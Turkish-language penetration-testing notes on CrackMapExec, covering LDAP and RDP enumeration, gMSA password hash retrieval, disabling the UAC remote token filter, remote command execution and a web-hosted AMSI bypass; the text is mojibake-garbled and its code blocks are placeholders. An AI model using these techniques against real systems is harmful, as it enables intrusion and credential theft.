[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

